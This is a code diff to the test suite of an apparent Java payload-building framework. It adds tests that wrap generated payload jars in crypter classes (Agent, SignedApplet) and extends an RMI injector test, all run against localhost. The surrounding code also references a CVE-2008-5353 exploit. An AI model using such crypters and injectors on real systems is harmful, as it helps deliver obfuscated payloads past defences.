@@ -43,6 +43,7 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
+import javapayload.Module;
 import javapayload.builder.AppletJarBuilder;
 import javapayload.builder.ClassBuilder;
 import javapayload.builder.CryptedJarBuilder;
@@ -52,8 +53,10 @@ import javapayload.builder.EmbeddedJarBuilder;
 import javapayload.builder.JarBuilder;
 import javapayload.builder.RMIInjector;
 import javapayload.builder.SpawnTemplate;
+import javapayload.crypter.Agent;
 import javapayload.crypter.JarLayout;
 import javapayload.crypter.MainClass;
+import javapayload.crypter.SignedApplet;
 import javapayload.handler.stage.TestStub;
 import javapayload.handler.stager.StagerHandler;
 import javapayload.stage.StageMenu;
@@ -75,9 +78,11 @@ public class BuilderTest {
 				new LocalStageJarBuilderTestRunner(),
 				new JarCrypterTestRunner(new LocalStageJarBuilderTestRunner(), "LocalStage.jar", new MainClass(), new String[] {"StaLo"}),
 				/* #JDK1.5 */new BuilderTest15.AgentJarBuilderTestRunner(), /**/
+				/* #JDK1.5 */new JarCrypterTestRunner(new BuilderTest15.AgentJarBuilderTestRunner(), "Agent_*.jar", new Agent(), new String[0]), /**/
 				new AppletJarBuilderTestRunner(),
 				new NewNameAppletJarBuilderTestRunner(),
 				new EmbeddedAppletJarBuilderTestRunner(),
+				new JarCrypterTestRunner(new EmbeddedAppletJarBuilderTestRunner(), "EmbeddedAppletJar.jar", new SignedApplet(), new String[] {"javapayload.loader.AppletLoader", "AppLo"}),
 				new EmbeddedNewNameAppletJarBuilderTestRunner(),
 				// /* #JDK1.4 */new BuilderTest14.CVE_2008_5353TestRunner(), /**/
 				// /* #JDK1.4 */new BuilderTest14.EmbeddedCVE_2008_5353TestRunner(), /**/
@@ -87,6 +92,7 @@ public class BuilderTest {
 				/* #JDK1.6 */new BuilderTest16.AttachInjectorTestRunner(), /**/
 				/* #JDK1.3 */new BuilderTest13.JDWPInjectorTestRunner(), /**/
 				new RMIInjectorTestRunner(),
+				//new JarCrypterTestRunner(new RMIInjectorTestRunner(), "rmitest.jar", new javapayload.crypter.RMI(), new String[] {"javapayload.loader.rmi.LoaderImpl", "RMILDR"}),
 		};
 		for (int i = 0; i < runners.length; i++) {
 			BuilderTestRunner runner = runners[i];
@@ -267,6 +273,9 @@ public class BuilderTest {
 
 		public void runBuilder(String[] args) throws Exception {
 			runner.runBuilder(args);
+			String jarName = this.jarName;
+			if (jarName.contains("*"))
+				jarName = Module.replaceString(jarName, "*", args[0]);
 			new File(jarName).renameTo(new File("uncrypted.jar"));
 			String[] crypterArgs = new String[] {
 					"uncrypted.jar",
@@ -484,6 +493,8 @@ public class BuilderTest {
 	}
 
 	public static class EmbeddedAppletJarBuilderTestRunner extends WaitingBuilderTestRunner {
+		public String loaderName = "javapayload.loader.AppletLoader";
+
 		public String getName() { return "EmbeddedAppletJarBuilder [kill]";	}
 
 		private ServerSocket ss;
@@ -498,7 +509,7 @@ public class BuilderTest {
 		}
 
 		public void runResult(String[] args) throws Exception {
-			runAppletAndWait(this, "EmbeddedAppletJar.jar", "javapayload.loader.AppletLoader", "grant { permission java.security.AllPermission; };", null, ss);
+			runAppletAndWait(this, "EmbeddedAppletJar.jar", loaderName, "grant { permission java.security.AllPermission; };", null, ss);
 			ss = null;
 			if (!new File("EmbeddedAppletJar.jar").delete())
 				throw new IOException("Unable to delete file");
@@ -539,6 +550,8 @@ public class BuilderTest {
 	}
 
 	public static class RMIInjectorTestRunner extends WaitingBuilderTestRunner {
+		public String loaderName = "";
+		
 		public String getName() { return "RMIInjector"; }
 
 		public void runBuilder(String[] args) throws Exception {
@@ -548,7 +561,7 @@ public class BuilderTest {
 		public void runResult(String[] args) throws Exception {
 			Process proc = runJava(".", null, "sun.rmi.registry.RegistryImpl", new String[] {"10999"});
 			String[] injectorArgs = new String[args.length + 3];
-			injectorArgs[0] = "file:./rmitest.jar";
+			injectorArgs[0] = "file:./rmitest.jar"+(loaderName.length() == 0 ? "" : "^^"+loaderName);
 			injectorArgs[1] = "localhost";
 			injectorArgs[2] = "10999";
 			System.arraycopy(args, 0, injectorArgs, 3, args.length);
